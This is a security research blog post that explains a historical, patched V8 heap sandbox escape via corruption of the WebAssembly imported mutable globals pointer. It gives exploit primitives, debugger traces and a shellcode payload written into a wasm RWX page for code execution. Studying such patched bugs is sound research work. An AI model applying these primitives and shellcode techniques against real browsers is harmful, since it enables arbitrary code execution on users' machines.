+++
tags = ["browser","v8","chromium"]
categories = ["Web Browsers", "Javascript Engines", "Chromium"]
description = "In anticipation of the future implementation of CFI on `code_entry_point` fields within function objects, I wanted to explore some patched sandbox escapes that have been found in the past."
date = "2023-01-08"
featuredpath = "date"
linktitle = ""
title = "Exploring Historical V8 Heap Sandbox Escapes I"
slug = "exploring-historical-v8-heap-sandbox-escapes-i"
type = "post"
+++

## Motivation

In anticipation of the future implementation of CFI on `code_entry_point` fields within function objects (the vector by which most publicly known heap sandbox escapes currently occur), I wanted to explore some patched sandbox escapes that have been found in the past.

In this post I'll be looking at the following patch: [\[sandbox\] Remove a number of native allocations from WasmInstanceObject](https://chromium-review.googlesource.com/c/v8/v8/+/3845636).


## Overview

The heap sandbox escape I'll be looking into today was originally found during DiceCTF 2022. The blog post detailing this technique can be found [here](https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/).

In practice it's pretty simple, involving corrupting memory within a WebAssembly instance object. Specifically the pointer to the instance's mutable globals store, allowing us to read or write arbitrary memory via global variables. 

This was due to WebAssembly storing globals data in a location external to the heap sandbox (meaning that it was an un-sandboxed external pointer). The patch for it just involved moving this data store to the heap itself.


## Enabling the Memory Corruption API

Before building, I thought it best to enable the memory corruption API rather than implement a vulnerability into V8 itself.

The memory corruption API implements several functions that makes manipulating memory within the heap sandbox a lot easier.

```diff
diff --git a/BUILD.gn b/BUILD.gn
index af24f4309a..5ca4c0666a 100644
--- a/BUILD.gn
+++ b/BUILD.gn
@@ -305,7 +305,7 @@ declare_args() {
 
   # Enable the experimental V8 sandbox.
   # Sets -DV8_ENABLE_SANDBOX.
-  v8_enable_sandbox = ""
+  v8_enable_sandbox = true
 
   # Enable sandboxing for all external pointers. Requires v8_enable_sandbox.
   # Sets -DV8_SANDBOXED_EXTERNAL_POINTERS.
@@ -317,7 +317,7 @@ declare_args() {
   # Expose the memory corruption API to JavaScript. Useful for testing the sandbox.
   # WARNING This will expose builtins that (by design) cause memory corruption.
   # Sets -DV8_EXPOSE_MEMORY_CORRUPTION_API
-  v8_expose_memory_corruption_api = false
+  v8_expose_memory_corruption_api = true
 
   # Experimental feature for collecting per-class zone memory stats.
   # Requires use_rtti = true
```

For this particular heap sandbox escape, we'll need to build out some typical exploit primitives. I won't go into much detail here, but you can find the relevant code below.

They pretty much all use the memory corruption api in their implementation, so I suggest you look
at the code for it (since it's completely undocumented, lmao) if you want to learn more.
[Here](https://chromium.googlesource.com/v8/v8/+/4a12cb1022ba335ce087dcfe31b261355524b3bf) is the
relevant commit.

```js
const addrof = o => {
  return Sandbox.getAddressOf(o);
};

const weak_read = p => {
  let reader = new Sandbox.MemoryView(p, 64);
  let view = new DataView(reader);
  return view.getBigUint64(0, true); 
};

const weak_write = (p, x) => {
  let writer = new Sandbox.MemoryView(p, 64);
  let view = new DataView(writer);
  view.setBigUint64(0, x, true);
};
```

## WebAssembly Mutable Globals 

Before digging into any memory corruption, I want to first explore web-assembly's mutable globals
functionality.

Some useful code for demonstrating this functionality can be found within the web-assembly
reference repo,
[here](https://github.com/mdn/webassembly-examples/blob/main/js-api-examples/global.wat). It
implements two functions, one for reading a 32-bit integer from a global variable, and another
incrementing that global variable by `1`.

```clojure
(module
  (global $g (import "js" "global") (mut i32))
  (func (export "getGlobal") (result i32)
    (global.get $g)
  )
  (func (export "incGlobal")
    (global.set $g (i32.add (global.get $g) (i32.const 1)))
  )
)
```

Note that the global variable has to be instantiated prior to the wasm instance, and it needs
to be passed to the wasm instance when it is created.

Running the below code will demonstrate both these functions, and how web-assembly mutable
globals are used in practice.

```js
const global = new WebAssembly.Global({ value: "i32", mutable: true }, 0);

let wasm = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x60, 0x00,
  0x01, 0x7f, 0x60, 0x00, 0x00, 0x02, 0x0e, 0x01, 0x02, 0x6a, 0x73, 0x06, 0x67,
  0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x03, 0x7f, 0x01, 0x03, 0x03, 0x02, 0x00, 0x01,
  0x07, 0x19, 0x02, 0x09, 0x67, 0x65, 0x74, 0x47, 0x6c, 0x6f, 0x62, 0x61, 0x6c,
  0x00, 0x00, 0x09, 0x69, 0x6e, 0x63, 0x47, 0x6c, 0x6f, 0x62, 0x61, 0x6c, 0x00,
  0x01, 0x0a, 0x10, 0x02, 0x04, 0x00, 0x23, 0x00, 0x0b, 0x09, 0x00, 0x23, 0x00,
  0x41, 0x01, 0x6a, 0x24, 0x00, 0x0b
]);
let module = new WebAssembly.Module(wasm);
let instance = new WebAssembly.Instance(module, {
  js: { global }
});

console.log(instance.exports.getGlobal()); // 0
instance.exports.incGlobal();
console.log(instance.exports.getGlobal()); // 1
```


## Corrupting the Imported Mutable Globals Pointer

Below is some javascript code that will allow us to explore how this memory changes when the
`incGlobal` wasm function is called.

```js
%DebugPrint(instance);
%SystemBreak();

instance.exports.incGlobal();
%SystemBreak();
```

In the debug print of the wasm instance object, we can see an interesting value pertaining to
web-assembly's mutable globals functionality. The pointer to `imported_mutable_globals`, and even
more interesting is that it appears to be an external pointer.

So what happens if we decide to corrupt the `imported_mutable_globals` pointer? Well it appears to
be a external pointer (i.e. outside of the heap), so logically we should be able to replace it in
order to read or modify an arbitrary location in memory. 

```
DebugPrint: 0x1f84001d4659: [WasmInstanceObject] in OldSpace
 - map: 0x1f8400207891 <Map[256](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x1f8400048709 <Object map = 0x1f8400208241>
 - elements: 0x1f8400002251 <FixedArray[0]> [HOLEY_ELEMENTS]
...
 - imported_mutable_globals: 0x55afdf05e3e0
...
```

When reading from the first entry in `imported_mutable_globals` we can see it holds a value of `0`.
Continuing so the `incGlobal` function is called, we can see that this value has been updated to
`1`. Which is what we'd expect. 

```
pwndbg> x/gx 0x55afdf05e3e0
0x55afdf05e3e0:	0x00001f8500001000
pwndbg> x/gx 0x00001f8500001000
0x1f8500001000:	0x0000000000000000
pwndbg> c
Continuing.

pwndbg> x/gx 0x00001f8500001000
0x1f8500001000:	0x0000000000000001
```

Let's see what happens when we completely corrupt the first pointer in the
`imported_mutable_globals` table. That is, not the `imported_mutable_globals` pointer itself,
but the first entry within it.

In the example below, I replace this entry with a pointer to `0x4141414141414141`, so we should
see a segmentation fault if we try to access it.

```
pwndbg> set *(uint64_t *)(0x56394c0dc3d0) = 0x4141414141414141
pwndbg> x/gx 0x56394c0dc3d0
0x56394c0dc3d0:	0x4141414141414141
pwndbg> c
Continuing.

Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
```

We receive a segmentation fault when trying to read from the location in memory we specified. In
the disassembly below, the next step was to incremement the value retrieved by `1`, before later
storing it back into the location in memory it was retrieved from.

This is exactly the behaviour we'd expect to see from a function that increments a global
variable.

```
 ► 0x2d0f6f7876a2    mov    ecx, dword ptr [rax]
   0x2d0f6f7876a4    add    ecx, 1
   0x2d0f6f7876a7    mov    rax, qword ptr [rsi + 0x57]
   0x2d0f6f7876ab    mov    rax, qword ptr [rax]
   0x2d0f6f7876ae    mov    dword ptr [rax], ecx
```

```
pwndbg> p/x $rax
$1 = 0x4141414141414141
```


## An Arbitrary Read Primitive

So the question becomes, how do we turn this functionality into arbitrary read or write
primitives?

Well, from observing the behaviour above, it would likely involve the corruption of one primary
value; that of the `imported_mutable_globals` pointer. But this value doesn't point directly to
the global variable that is modified - so we'd need to point it to an area of memory we control
and store a pointer to the memory we want to modify at that location.

The below web-assembly will read a 64-bit value from a mutable global variable.

```clojure
(module
  (global $g (import "js" "global") (mut i64))
  (func (export "read") (result i64)
    (global.get $g)
  )
)
```

```js
const global = new WebAssembly.Global({ value: "i64", mutable: true }, 0n);

let wasm = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x05, 0x01, 0x60, 0x00,
  0x01, 0x7e, 0x02, 0x0e, 0x01, 0x02, 0x6a, 0x73, 0x06, 0x67, 0x6c, 0x6f, 0x62,
  0x61, 0x6c, 0x03, 0x7e, 0x01, 0x03, 0x02, 0x01, 0x00, 0x07, 0x08, 0x01, 0x04,
  0x72, 0x65, 0x61, 0x64, 0x00, 0x00, 0x0a, 0x06, 0x01, 0x04, 0x00, 0x23, 0x00,
  0x0b
]);
let module = new WebAssembly.Module(wasm);
let instance = new WebAssembly.Instance(module, {
  js: { global }
});
```

As mentioned above, the primary objective we need to achieve is control over the
`imported_mutable_globals` table. I did this by simply pointing it to the elements store of
a float array. This way the entries within the table could easily be replaced.

If we want to replace this value with a location on the heap, this will also require a heap
address leak (which is easily obtained).

```js
let heap = (weak_read(0x18) >> 32n) << 32n;
let store = [1.1];
let elements = heap + (weak_read(addrof(store) + 0x8) & 0xffffffffn);
weak_write(addrof(instance) + 0x58, elements + 8n - 1n);

store[0] = utof(0xdeadbeefn);
instance.exports.read();
```

```
Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
...
 ► 0x2e60bc29c662    mov    rcx, qword ptr [rax]
...
pwndbg> p/x $rax
$1 = 0xdeadbeef
```

This is easily extracted out into a function. A pointer is provided and stored in the controlled
`imported_mutable_globals` table, and a value is read from it.

```js
const strong_read = p => {
  store[0] = utof(p);
  return itou(instance.exports.read());
};
```


## An Arbitrary Write Primitive

The arbitrary write primitive is implemented in an almost identical manner to the read primitive.
However, a new web-assembly function is introduced that writes a 64-bit integer to the global
variable.

```clojure
(module
  (global $g (import "js" "global") (mut i64))
  (func (export "read") (result i64)
    (global.get $g)
  )
  (func (export "write") (param $p i64)
    (global.set $g (local.get $p))
  )
)
```

You can see how similar it is to the read primitive. It uses the same logic to replaced the
pointer to the location in memory we want to modify. The only difference being that the
web-assembly function used to write to a global variable is called.

```js
const strong_write = (p, x) => {
  store[0] = utof(p);
  instance.exports.write(x);
};
```


## Code Execution

In order to achieve code execution we don't actually require the arbitrary read primitive, it was
really just an extra primitive to explore. All the values we need to leak are already stored on
the heap.

The arbitrary write primitive however, is extremely useful. In the code below, it is used to write
shellcode to the `rwx` page allocated by a wasm instance object. This, of course, is a very well
documented technique used to achieve code execution in V8.

```js
let _wasm = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x85, 0x80, 0x80, 0x80,
  0x00, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80, 0x00, 0x01,
  0x00, 0x04, 0x84, 0x80, 0x80, 0x80, 0x00, 0x01, 0x70, 0x00, 0x00, 0x05, 0x83,
  0x80, 0x80, 0x80, 0x00, 0x01, 0x00, 0x01, 0x06, 0x81, 0x80, 0x80, 0x80, 0x00,
  0x00, 0x07, 0x91, 0x80, 0x80, 0x80, 0x00, 0x02, 0x06, 0x6d, 0x65, 0x6d, 0x6f,
  0x72, 0x79, 0x02, 0x00, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00, 0x0a, 0x8a,
  0x80, 0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80, 0x00, 0x00, 0x41, 0x2a,
  0x0b
]);
let _module = new WebAssembly.Module(_wasm);
let _instance = new WebAssembly.Instance(_module);

let rwx = weak_read(addrof(_instance) + 0x68); 

let shellcode = [
  0x732f6e69622fb848n,
  0x66525f5450990068n,
  0x15e8525e54632d68n,
  0x4c50534944000000n,
  0x302e303a273d5941n,
  0x00636c6163782027n,
  0x0f583b6a5e545756n,
  0x0000000000000005n
];
for (let i = 0; i < shellcode.length; i++)
  strong_write(rwx + (8n * BigInt(i)), shellcode[i]);

_instance.exports.main();
```


## References
 - [\[sandbox\] Remove a number of native allocations from WasmInstanceObject](https://chromium-review.googlesource.com/c/v8/v8/+/3845636)
 - [DiceCTF 2022 - Memory Hole | kylebot's Blog](https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/)
 - [WebAssembly.Global() constructor - WebAssembly | MDN](https://developer.mozilla.org/en-US/docs/WebAssembly/JavaScript_interface/Global/Global)
